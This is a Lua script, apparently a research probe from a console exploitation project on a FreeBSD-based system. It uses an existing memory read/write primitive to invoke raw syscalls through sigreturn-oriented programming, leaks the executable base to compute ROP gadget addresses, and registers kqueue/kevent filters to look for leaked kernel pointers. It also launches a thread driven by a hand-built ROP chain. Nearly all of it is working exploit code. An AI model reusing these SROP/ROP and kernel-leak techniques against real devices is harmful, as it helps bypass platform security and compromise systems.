-- CRASH_CLASS: LOW
-- PROBE 142u: Minimal kqueue + kevent EVFILT_PROC test

print("=== PROBE 142u: KEVENT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local einfo = memory.alloc(0x200)
wd(einfo, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(einfo)) end)
local elo = safe_rd(einfo + 0x108) or 0
local ehi = safe_rd(einfo + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

print("eboot=" .. string.format("0x%X%08X", ehi, elo))

--------------------------------------------------------------------
-- [A] kqueue via SROP
--------------------------------------------------------------------
print("")
print("--- [A] kqueue ---")

local rv_kq = srop(362)
local kqh, kql = get_hi_lo(rv_kq)
print("[A] kqueue ret=" .. hex(rv_kq))

if kql >= 256 or kqh ~= 0 then
    print("[A] kqueue FAILED")
    print("=== DONE ===")
    return
end

local kq_fd = kql
print("[A] kqueue fd=" .. kq_fd)

--------------------------------------------------------------------
-- [B] kevent register EVFILT_PROC for our PID
-- struct kevent (FreeBSD 11, 64-bit):
-- +0x00: ident (uintptr_t=8)
-- +0x08: filter (short=2) + flags (u_short=2) + fflags (u_int=4)
-- +0x10: data (intptr_t=8)
-- +0x18: udata (void*=8)
-- Total = 0x20 = 32
--------------------------------------------------------------------
print("")
print("--- [B] Register EVFILT_PROC ---")

local kev_change = gpu + 0x1000
-- ident = pid
wq(kev_change + 0x00, uint64(pid))
-- filter = EVFILT_PROC = -5 (0xFFFB as int16)
-- flags = EV_ADD = 1
-- Pack: [filter_lo][filter_hi][flags_lo][flags_hi] = FB FF 01 00
wd(kev_change + 0x08, 0x0001FFFB)
-- fflags = NOTE_EXIT (0x80000000)
wd(kev_change + 0x0C, 0x80000000)
-- data = 0
wq(kev_change + 0x10, uint64(0))
-- udata = marker
wq(kev_change + 0x18, uint64(0xDEADBEEF))

-- Timeout: zero (instant poll)
local ts0 = gpu + 0x1100
wq(ts0, uint64(0))
wq(ts0 + 8, uint64(0))

-- Result event (filled with sentinel)
local kev_result = gpu + 0x1200
for off = 0, 0x1F, 4 do wd(kev_result + off, 0xEE) end

-- kevent(560): (kq, changelist, nchanges, eventlist, nevents, timeout)
local rv_ke = srop(560, uint64(kq_fd), ua(kev_change), uint64(1),
                    ua(kev_result), uint64(1), ua(ts0))
local keh, kel = get_hi_lo(rv_ke)
print("[B] kevent(register) ret=" .. hex(rv_ke))

-- Dump result
local function dump_kevent(label, base)
    local ident = safe_rq(base)
    local ff = safe_rd(base + 0x08)
    local ffl = safe_rd(base + 0x0C)
    local data = safe_rq(base + 0x10)
    local udata = safe_rq(base + 0x18)
    print(label .. " ident=" .. hex(ident) .. " ff=0x" .. string.format("%08X", ff or 0))
    print(label .. " fflags=0x" .. string.format("%08X", ffl or 0))
    print(label .. " data=" .. hex(data) .. " udata=" .. hex(udata))
    if data then
        local dh, dl = get_hi_lo(data)
        if dh >= 0xFFFF8000 then
            print(label .. " *** KERNEL PTR in data! ***")
        end
    end
end

dump_kevent("[B]", kev_result)

--------------------------------------------------------------------
-- [C] Register EVFILT_READ on socketpair fd
-- When data is available on a socket, kevent fires.
-- data field = bytes available. Check for kernel residue.
--------------------------------------------------------------------
print("")
print("--- [C] EVFILT_READ on socket ---")

-- Create socketpair
local sp = gpu + 0x2000
wd(sp, 0xDEAD); wd(sp + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp))
local fd_a = safe_rd(sp)
local fd_b = safe_rd(sp + 4)
print("[C] socketpair: " .. (fd_a or "nil") .. ", " .. (fd_b or "nil"))

if fd_a and fd_a ~= 0xDEAD then
    -- Write some data to fd_a
    local wbuf = gpu + 0x2100
    wd(wbuf, 0x54534554)
    srop(4, uint64(fd_a), ua(wbuf), uint64(4))

    -- Register EVFILT_READ (-1) on fd_b
    local kev2 = gpu + 0x3000
    wq(kev2 + 0x00, uint64(fd_b))  -- ident = fd
    wd(kev2 + 0x08, 0x0001FFFF)     -- filter=-1(EVFILT_READ), flags=1(EV_ADD)
    wd(kev2 + 0x0C, 0)              -- fflags
    wq(kev2 + 0x10, uint64(0))      -- data
    wq(kev2 + 0x18, uint64(0xCAFE)) -- udata

    local kev2_r = gpu + 0x3100
    for off = 0, 0x1F, 4 do wd(kev2_r + off, 0xEE) end

    local rv2 = srop(560, uint64(kq_fd), ua(kev2), uint64(1),
                      ua(kev2_r), uint64(1), ua(ts0))
    print("[C] kevent(READ) ret=" .. hex(rv2))
    dump_kevent("[C]", kev2_r)
end

--------------------------------------------------------------------
-- [D] Register EVFILT_TIMER
--------------------------------------------------------------------
print("")
print("--- [D] EVFILT_TIMER ---")

local kev3 = gpu + 0x4000
wq(kev3 + 0x00, uint64(1))      -- ident = timer 1
-- EVFILT_TIMER = -7 = 0xFFF9
wd(kev3 + 0x08, 0x0001FFF9)     -- filter=-7, flags=EV_ADD
wd(kev3 + 0x0C, 0)
wq(kev3 + 0x10, uint64(10))     -- data = 10ms interval
wq(kev3 + 0x18, uint64(0xBEEF))

local kev3_r = gpu + 0x4100
for off = 0, 0x1F, 4 do wd(kev3_r + off, 0xEE) end

-- Register
srop(560, uint64(kq_fd), ua(kev3), uint64(1), uint64(0), uint64(0), ua(ts0))

-- Wait 50ms
local ts50 = memory.alloc(16)
wq(ts50, uint64(0))
wq(ts50 + 8, uint64(50000000))
pcall(function() sc_nanosleep(uint64(ts50), uint64(0)) end)

-- Poll for timer events
for off = 0, 0x1F, 4 do wd(kev3_r + off, 0xEE) end
local rv3 = srop(560, uint64(kq_fd), uint64(0), uint64(0),
                  ua(kev3_r), uint64(1), ua(ts0))
print("[D] kevent(TIMER poll) ret=" .. hex(rv3))
dump_kevent("[D]", kev3_r)

--------------------------------------------------------------------
-- [E] Create thread, let it exit, poll EVFILT_PROC
--------------------------------------------------------------------
print("")
print("--- [E] Thread exit + EVFILT_PROC ---")

-- Short-lived thread: nanosleep 50ms then thr_exit
local tspec = gpu + 0x5000
wq(tspec, uint64(0))
wq(tspec + 8, uint64(50000000))

local rop = gpu + 0x10000
local i = 0
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, ua(tspec)); i=i+8
wq(rop + i, g_pop_rsi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(240)); i=i+8
wq(rop + i, sc_addr); i=i+8
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(431)); i=i+8
wq(rop + i, sc_addr); i=i+8

local ctx = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
pcall(function() return sc_gc(uint64(ctx)) end)
wq(ctx + 0xE0, g_ret)
wq(ctx + 0xF8, ua(rop))

local tid = gpu + 0x30000
wq(tid, uint64(0xDEADDEAD))
pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid), uint64(0))
end)
local ntid = safe_rq(tid)
local nth, ntl = get_hi_lo(ntid)
print("[E] thread tid=" .. ntl)

-- Wait 200ms
local ts200 = memory.alloc(16)
wq(ts200, uint64(0))
wq(ts200 + 8, uint64(200000000))
pcall(function() sc_nanosleep(uint64(ts200), uint64(0)) end)

-- Verify thread is dead
local rv_tk = srop(433, uint64(ntl), uint64(0))
print("[E] thr_kill=" .. hex(rv_tk))

-- Poll kevent
local kev_e = gpu + 0x6000
for off = 0, 0x1F, 4 do wd(kev_e + off, 0xEE) end

local rv_e = srop(560, uint64(kq_fd), uint64(0), uint64(0),
                   ua(kev_e), uint64(1), ua(ts0))
print("[E] kevent(poll) ret=" .. hex(rv_e))
dump_kevent("[E]", kev_e)

print("")
print("=== DONE ===")
